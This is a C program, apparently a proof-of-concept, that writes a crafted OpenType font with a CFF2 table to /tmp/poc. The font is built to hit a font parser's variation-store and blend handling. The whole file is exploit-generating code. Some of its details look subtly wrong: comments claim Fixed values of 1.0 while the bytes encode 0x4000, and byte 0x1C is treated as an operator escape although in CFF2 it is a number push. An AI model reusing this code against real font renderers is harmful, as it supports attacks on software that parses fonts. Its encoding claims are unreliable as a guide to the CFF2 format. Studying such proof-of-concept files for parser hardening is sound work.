#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    unsigned char buf[1024];
    int pos = 0;

    /* CFF2 Header (5 bytes) */
    buf[pos++] = 0x02; buf[pos++] = 0x00; buf[pos++] = 0x05;
    int topDictLenPos = pos;
    buf[pos++] = 0; buf[pos++] = 0; /* placeholder */

    /* Top DICT */
    int topDictStart = pos;

    /* VarStore: push offset (3 bytes), op 0x1C 0x19 */
    int varStoreOffPos = pos;
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
    buf[pos++] = 0x1C; buf[pos++] = 0x19;

    /* Private: push size, push offset, op 0x1C 0x12 */
    int privSizePos = pos;
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
    int privOffPos = pos;
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
    buf[pos++] = 0x1C; buf[pos++] = 0x12;

    /* CharStrings: push offset, op 0x1C 0x11 */
    int charOffPos = pos;
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* placeholder */
    buf[pos++] = 0x1C; buf[pos++] = 0x11;

    int topDictEnd = pos;
    int topDictLen = topDictEnd - topDictStart;

    /* CharStrings INDEX */
    int charStart = pos;
    buf[pos++] = 0; buf[pos++] = 1; /* count = 1 */
    buf[pos++] = 1; /* offSize = 1 */
    buf[pos++] = 1; buf[pos++] = 2; /* offsets */
    buf[pos++] = 0x0D; /* endchar */

    /* VarStore data */
    int varStoreStart = pos;
    buf[pos++] = 0; buf[pos++] = 0; /* format = 0 */
    buf[pos++] = 0; buf[pos++] = 1; /* dataCount = 1 */
    buf[pos++] = 0; buf[pos++] = 1; /* axisCount = 1 */
    buf[pos++] = 0; buf[pos++] = 1; /* regionCount = 1 */
    /* Region: axis=0, start=0.0, peak=1.0, end=1.0 (Fixed 16.16) */
    buf[pos++] = 0; buf[pos++] = 0; /* axis index = 0 */
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0; /* start = 0.0 */
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0x40; buf[pos++] = 0; /* peak = 1.0 (0x00010000) */
    buf[pos++] = 0; buf[pos++] = 0; buf[pos++] = 0x40; buf[pos++] = 0; /* end = 1.0 */
    /* VarData: regionIndicesCount=1, regionIndices[0]=0 */
    buf[pos++] = 0; buf[pos++] = 1; /* regionIndicesCount */
    buf[pos++] = 0; buf[pos++] = 0; /* regionIndices[0] = 0 */

    /* Private DICT */
    int privStart = pos;
    /* vsindex 0 */
    buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 0; /* push 0 */
    buf[pos++] = 0x1C; buf[pos++] = 0x16; /* vsindex */
    /* Two blends: each pushes 1,1,1,1,2,blend */
    for (int i = 0; i < 2; i++) {
        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 1; /* push 1 */
        buf[pos++] = 0x1C; buf[pos++] = 0; buf[pos++] = 2; /* push 2 */
        buf[pos++] = 0x1C; buf[pos++] = 0x17; /* blend */
    }
    int privSize = pos - privStart;

    /* Fix placeholders */
    buf[topDictLenPos]   = (topDictLen >> 8) & 0xFF;
    buf[topDictLenPos+1] = topDictLen & 0xFF;

    buf[varStoreOffPos]   = (varStoreStart >> 16) & 0xFF;
    buf[varStoreOffPos+1] = (varStoreStart >> 8) & 0xFF;
    buf[varStoreOffPos+2] = varStoreStart & 0xFF;

    buf[privSizePos]   = (privSize >> 16) & 0xFF;
    buf[privSizePos+1] = (privSize >> 8) & 0xFF;
    buf[privSizePos+2] = privSize & 0xFF;

    buf[privOffPos]   = (privStart >> 16) & 0xFF;
    buf[privOffPos+1] = (privStart >> 8) & 0xFF;
    buf[privOffPos+2] = privStart & 0xFF;

    buf[charOffPos]   = (charStart >> 16) & 0xFF;
    buf[charOffPos+1] = (charStart >> 8) & 0xFF;
    buf[charOffPos+2] = charStart & 0xFF;

    int cff2Len = pos;

    /* Write OpenType container */
    /* sfVersion = 0x00010000 */
    fputc(0, f); fputc(1, f); fputc(0, f); fputc(0, f);
    /* numTables=1, searchRange=0, entrySelector=0, rangeShift=0 */
    fputc(0, f); fputc(1, f); /* numTables */
    fputc(0, f); fputc(0, f); /* searchRange */
    fputc(0, f); fputc(0, f); /* entrySelector */
    fputc(0, f); fputc(0, f); /* rangeShift */
    /* Table directory: tag 'CFF2' */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(0, f); /* checksum */
    fputc(0, f); fputc(0, f); fputc(0, f); fputc(28, f); /* offset = 28 */
    fputc((cff2Len >> 24) & 0xFF, f);
    fputc((cff2Len >> 16) & 0xFF, f);
    fputc((cff2Len >> 8) & 0xFF, f);
    fputc(cff2Len & 0xFF, f);

    /* Write CFF2 data at offset 28 */
    fseek(f, 28, SEEK_SET);
    fwrite(buf, 1, cff2Len, f);

    fclose(f);
    return 0;
}